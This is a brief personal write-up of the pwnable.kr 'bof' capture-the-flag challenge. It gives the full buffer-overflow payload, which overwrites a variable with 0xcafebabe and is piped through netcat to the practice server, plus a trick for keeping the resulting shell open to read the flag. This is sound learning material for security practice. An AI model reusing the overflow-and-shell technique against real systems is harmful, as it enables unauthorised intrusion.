# bof

Had to look at the solution off youtube for this one. I've done a buffer overflow before but in
this case when you overflow the buffer with something like 64 * 'a', the program will terminate
with:

"*** stack smashing detected ***"

Learnt that this was a result of having a stack canary which is a special value on the stack
which when overritten, will terminate the program, to prevent buffer overflows attacks.

Piping an echo command via:
echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM\xbe\xba\xfe\xca" | nc pwnable.kr 9000

should allow you to overwrite the buffer to 0xcafebabe but instead results in stack smashing
detected termination.

The youtube video had a neat little trick where you can do this:
(echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM\xbe\xba\xfe\xca"; cat) 
| nc pwnable.kr 9000

because echo closes the nc shell after the pipe is complete, you can ask it to execute cat to
keep the shell open.

ls - and then you will see a flag file that you can cat.



